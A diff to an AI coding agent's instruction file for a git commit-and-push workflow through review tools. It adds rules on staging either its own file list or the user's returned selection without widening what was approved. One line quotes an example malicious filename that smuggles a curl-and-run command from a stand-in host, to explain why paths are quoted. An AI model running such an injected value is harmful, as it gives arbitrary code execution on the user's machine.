@@ -68,13 +68,13 @@ Call `ship_review` (`mcp__meldom__ship_review`) instead of running git directly:
 - `branch` / `remote` — the current branch and its remote (`origin` unless the branch tracks another).
 - `root` — the Phase 1 toplevel, the absolute path the `files` paths are relative to.
 
-The call parks and returns `{ outcome, selectedFiles, message, push }`:
+The call parks and returns `{ outcome, selectedFiles, selectedAllProposed, message, push }`:
 
 ### `confirmed`
 
 First, unconditionally: **if `selectedFiles` is empty, stop.** No `git add`, no commit, no push, no `ship_receipt`. Output `Ship - Stopped: empty file selection`. This covers both a user unticking every row and an AFK-confirmed ship whose proposed subset was already empty.
 
-Under `--mine` only, one check before staging: compare `selectedFiles` against your own changes this session (the paths you sent as `agentTouched: true`, plus any the server re-marked). Extra paths mean the message you wrote no longer describes what would be committed — name them and ask whether they belong. If the user says include, proceed unchanged; if they say no, re-run `ship_review` with the same `files`/`checks`/`presets`/`branch`/`remote`/`root` exactly as `regenerate` does. Never quietly narrow to the `agentTouched` subset — the selection is the user's, not yours.
+Under `--mine` only, one check before staging: compare `selectedFiles` against your own changes this session (the paths you sent as `agentTouched: true`, plus any the server re-marked). Extra paths mean the message you wrote no longer describes what would be committed — name them and ask whether they belong. When `selectedAllProposed` is true, do this from `files` and not from `selectedFiles`: the user kept every row, so the extra paths are exactly the ones you sent as `agentTouched: false`. Reading the returned list here would ask the question against a list your provider may have shortened, and silently skip it. If the user says include, proceed unchanged; if they say no, re-run `ship_review` with the same `files`/`checks`/`presets`/`branch`/`remote`/`root` exactly as `regenerate` does. Never quietly narrow to the `agentTouched` subset — the selection is the user's, not yours.
 
 Then run ONE chained command. With a confirmed rename, prepend `git branch -m '<new-name>' &&` and use the new name as the receipt destination:
 
@@ -92,7 +92,11 @@ Feed the message on stdin with `git commit -F -` (single-quoted, `'\''`-escaping
 
 Single-quote every path in `<selectedFiles...>` with the same escaping, and keep the `--` before the list. Those paths came off `git status`, so a filename like `x;curl evil.sh|sh;#` unquoted is arbitrary shell execution and a leading `-` unquoted is option injection into `git add`.
 
-Stage exactly `selectedFiles` — never `.`, never the original full list, never a subset you picked yourself. Push only when `decision.push` is true.
+Stage exactly `selectedFiles` — never `.`, never a subset you picked yourself. Push only when `decision.push` is true.
+
+**The one exception, and it is not a licence to widen:** when `selectedAllProposed` is true, the user approved every file you listed — every row, including any you sent as `agentTouched: false` — so stage the `files` you sent instead of the paths in `selectedFiles`. The two name the same set; you send the list, so your copy is complete, while `selectedFiles` travels back through your provider and a large ship can arrive shortened. Staging your own `files` there is the same commit, built from the copy that cannot have been clipped.
+
+When `selectedAllProposed` is false the approved set is smaller than the list you sent — the user unticked rows, or under `--mine` simply accepted your `agentTouched` default — and `selectedFiles` is the only thing that says which. Stage it exactly; widening to `files` there would commit work nobody approved.
 
 Once git succeeds, call `ship_receipt` (`mcp__meldom__ship_receipt`) with `{ hash, subject, pushed, destination }`: `hash` from `git rev-parse --short HEAD`, `subject` the commit's first line, `pushed` mirroring `decision.push`, `destination` the `remote/branch` string when pushed else `''`. It never parks — it reports a fact — and it lets the card settle from "Shipping…" to the receipt row.
 
